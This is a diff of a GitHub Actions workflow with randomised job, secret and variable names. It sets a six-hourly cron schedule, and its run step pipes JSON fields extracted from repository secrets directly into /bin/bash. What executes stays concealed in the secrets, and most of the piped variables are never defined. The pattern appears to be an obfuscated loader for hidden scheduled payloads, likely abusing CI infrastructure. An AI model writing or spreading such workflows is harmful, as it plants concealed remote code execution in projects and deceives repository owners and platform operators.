@@ -3,7 +3,8 @@ name: lengrufeng6819
 on:
   workflow_dispatch:
   schedule:
-    - cron: '22 0/6 * * *'
+    - cron: '45 1/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -12,14 +13,21 @@ jobs:
       - uses: actions/checkout@v4
       - name: lengrufeng6819
         env:
-          syll83643: ${{ secrets.syll83643 }}
+          h65882: ${{ secrets.h65882 }}
         run: |
-          echo $syll83643 | jq -r .tbgm3677 | /bin/bash
-          echo $lwj35 | jq -r .vff9832 | /bin/bash
-          echo $t02434 | jq -r .wt2 | /bin/bash
-          echo $igow9091 | jq -r .ztsf2910 | /bin/bash
-          echo $e0919 | jq -r .qy30507 | /bin/bash
-          echo $sv519 | jq -r .qs2 | /bin/bash
-          echo $mzui5 | jq -r .aajh6 | /bin/bash
-          echo $lx2173 | jq -r .s136 | /bin/bash
+          echo $h65882 | jq -r .fmc248 | /bin/bash
+          echo $zot00917 | jq -r .tifo245 | /bin/bash
+          echo $sefe94453 | jq -r .r375 | /bin/bash
+          echo $zjetb2 | jq -r .ooa05809 | /bin/bash
+          echo $hmw4019 | jq -r .ao43306 | /bin/bash
+          echo $iwuv85 | jq -r .hyjbv29045 | /bin/bash
+          echo $d876 | jq -r .m0 | /bin/bash
+          echo $koha331 | jq -r .apge8754 | /bin/bash
+          echo $ueadt3536 | jq -r .jyraj0 | /bin/bash
+          echo $vglg15437 | jq -r .e92 | /bin/bash
+          echo $udaiv0489 | jq -r .bzyyx172 | /bin/bash
+          echo $znglj5 | jq -r .qi751 | /bin/bash
+          echo $uf9135 | jq -r .rfxde58 | /bin/bash
+          echo $myj6 | jq -r .jp077 | /bin/bash
+          echo $cp86226 | jq -r .tzb149 | /bin/bash
 
